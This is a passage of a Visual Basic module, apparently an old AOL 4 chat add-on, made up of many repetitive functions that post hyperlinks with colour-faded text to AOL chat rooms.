    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBluePurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBluePurpleBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueRedBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_UlineLinkBoldBlueYellowBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenPurpleGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenRedGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreenYellowGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyBlueGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyGreenGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyPurpleGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyRedGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkGreyYellowGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenPurpleGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenRedGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreenYellowGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyBlueGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyGreenGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyPurpleGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyRedGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_UlineLinkBoldGreyYellowGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackPurpleBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackedRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlackYellowBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
